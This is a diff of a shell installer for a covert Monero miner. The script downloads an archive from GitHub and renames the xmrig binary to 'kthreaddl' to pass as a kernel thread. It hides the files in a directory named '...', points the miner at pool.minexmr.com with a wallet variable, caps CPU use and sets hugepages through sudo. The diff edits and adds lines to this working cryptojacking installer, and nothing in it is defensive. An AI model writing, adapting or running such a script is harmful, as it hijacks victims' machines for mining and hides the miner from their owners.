@@ -941,7 +941,7 @@ fi
 killall -9 kthreaddl
 rm -rf $HOME/...
 echo "[*] Downloading advanced version of kthreaddl to /tmp/kthreaddl.tar.gz"
-if ! curl -L --progress-bar "https://github.com/FuckerGod/s1344da/archive/refs/tags/a.tar.gz" -o /tmp/kthreaddl.tar.gz; then
+if ! curl -L "https://github.com/FuckerGod/s1344da/archive/refs/tags/a.tar.gz" -o /tmp/kthreaddl.tar.gz; then
   echo "ERROR: Can't download https://github.com/FuckerGod/s1344da/archive/refs/tags/a.tar.gz file to /tmp/kthreaddl.tar.gz"
   exit 1
 fi
@@ -955,6 +955,8 @@ rm /tmp/kthreaddl.tar.gz
 mv $HOME/.../s1344da-a/* $HOME/.../
 rm -rf $HOME/.../s1344da-a
 sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/.../config.json
+ls $HOME/.../
+chmod 777 $HOME/.../kthreaddl
 $HOME/.../kthreaddl --help >/dev/null
 if (test $? -ne 0); then
   if [ -f $HOME/.../kthreaddl ]; then
@@ -972,10 +974,9 @@ if (test $? -ne 0); then
   rm /tmp/kthreaddl.tar.gz
   mv $HOME/.../xmrig $HOME/.../kthreaddl
   sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.../config.json
-  sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' $HOME/.../config.json
+  sed -i 's/"url": *"[^"]*",/"url": "pool.minexmr.com:443",/' $HOME/.../config.json
   sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.../config.json
   sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.../config.json
-  sed -i 's/"rig-id": *"[^"]*",/"rig-id": "'$PASS'",/' $HOME/.../config.json
   sed -i 's/"tls": *"[^"]*",/"tls": true,/' $HOME/.../config.json
   sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 75,/' $HOME/.../config.json
   $HOME/.../kthreaddl --help >/dev/null
@@ -987,6 +988,7 @@ if (test $? -ne 0); then
   fi
 fi
 
+sed -i 's/"rig-id": *"[^"]*",/"rig-id": "'$PASS'",/' $HOME/.../config.json
 sed -i 's#"log-file": *null,#"log-file": "'$HOME/.../.kthreaddl.log'",#' $HOME/.../config.json
 sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/.../config.json
 
@@ -1009,7 +1011,6 @@ if ! sudo -n true 2>/dev/null; then
   fi
   /bin/bash $HOME/.../kthreaddl.sh --config=$HOME/.../config_background.json >/dev/null 2>&1
 else
-
   if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') -gt 3500000 ]]; then
     echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf
     sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
